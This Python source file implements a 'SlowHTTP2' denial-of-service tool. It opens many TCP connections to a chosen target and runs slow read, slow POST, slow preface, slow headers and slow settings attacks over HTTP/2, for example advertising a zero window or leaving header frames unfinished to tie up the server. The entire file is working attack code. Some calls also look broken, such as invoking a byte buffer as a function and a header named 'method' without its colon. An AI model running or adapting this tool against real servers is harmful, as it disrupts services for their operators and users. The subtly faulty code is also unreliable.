import socket
import h2.connection
from h2.config import H2Configuration
from hyperframe.frame import SettingsFrame, WindowUpdateFrame, HeadersFrame
from hpack.hpack_compat import Encoder
import multiprocessing

from slowhttp2settings import LOGGER, args

CONNECTION_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
WINDOW_SIZE_INCREMENT = 1073676289

cons = multiprocessing.Value('i', 0)
closed = multiprocessing.Value('i', 0)


class Attack():
    """SlowHTTP2 Attack Class
    - creates connection
    - defines attacks"""
    def __init__(self, attype):
        self.type = attype
        self.ATTACKS = {
            "read": self.slow_read,
            "post": self.slow_post,
            "preface": self.slow_preface,
            "headers": self.slow_headers,
            "settings": self.slow_settings
        }
        self.config = H2Configuration(logger=LOGGER)

    def establish_tcp_connection(self):
        try:
            s = socket.create_connection((args.target, args.port))
            return s
        except socket.error:
            return False
    
    def slow_read(self, conn, h2conn):
        LOGGER.info("SLOW READ ATTACK================================")
        h2conn._data_to_send += CONNECTION_PREFACE
        h2conn.update_settings({SettingsFrame.INITIAL_WINDOW_SIZE: 0})
        conn.sendall(h2conn._data_to_send())
        headers = [
            (":authority", args.target),
            (":path", "/"),
            (":scheme", "http"),
            (":method", "GET")
        ]
        h2conn.send_headers(1, headers, end_stream=True)
        conn.sendall(h2conn._data_to_send())
    
    def slow_post(self, conn, h2conn):
        LOGGER.info("SLOW POST ATTACK================================")
        h2conn.initiate_connection()
        wf = WindowUpdateFrame(0)
        wf.window_increment = WINDOW_SIZE_INCREMENT

        h2conn._data_to_send += wf.serialize()
        conn.sendall(h2conn._data_to_send())

        headers = [
            (":authority", args.target),
            (":path", "/"),
            (":scheme","http"),
            (":method", "POST")
        ]
        hf = HeadersFrame(1)
        hf.flags.add("END_HEADERS")
        e = Encoder()
        hf.data = e.encode(headers)

        h2conn._data_to_send += hf.serialize()
        conn.sendall(h2conn.data_to_send())

    def slow_preface(self, conn, h2conn):
        LOGGER.info("SLOW PREFACE ATTACK=============================")
        h2conn.sendall(h2conn.data_to_send())
        conn.sendall(h2conn.data_to_send())

    def slow_headers(self, conn, h2conn, method="GET"):
        LOGGER.info("SLOW HEADERS ATTACK=============================")
        h2conn.initiate_connection()
        wf = WindowUpdateFrame(0)
        wf.window_increment = WINDOW_SIZE_INCREMENT
        h2conn._data_to_send += wf.serialize()
        conn.sendall(h2conn.data_to_send())

        headers = [
            (":authority", args.target),
            (":path", "/"),
            (":scheme", "http"),
            ("method", method)
        ]
        hf = HeadersFrame(1)
        if method == "GET":
            hf.flags.add("END_STREAM")
        e = Encoder()
        hf.data = e.encode(headers)
        h2conn._data_to_send += hf.serialize()
        conn.sendall(h2conn.data_to_send())

    def slow_settings(self, conn, h2conn):
        LOGGER.info("SLOW SETTINGS ATTACK============================")
        h2conn.initiate_connection()
        wf = WindowUpdateFrame(0)
        wf.window_increment = WINDOW_SIZE_INCREMENT
        h2conn._data_to_send += wf.serialize()
        conn.sendall(h2conn.data_to_send())

        headers = [
            (":authority", args.target),
            (":path", "/"),
            (":scheme", "http"),
            (":method", "GET")
        ]
        h2conn.send_headers(1, headers, end_stream=True)
        conn.sendall(h2conn.data_to_send())
    
    def start_attack(self, data):
        self.connection = self.establish_tcp_connection()
        if(not self.connection):
            return False
        self.http2_connection = h2.connection.H2Connection(config=self.config)
        
        with cons.get_lock():
            cons.value += 1
        
        try:
            self.ATTACKS[self.type](self.connection, self.http2_connection)
        except Exception:
            print("Invalid Attack Type !!!")

        while True:
            data = self.connection.recv(1024)
            LOGGER.info("DATA: {}".format(data))
            if not data:
                break

        with closed.get_lock():
            closed.value += 1
        
        self.connection.close()
        return True
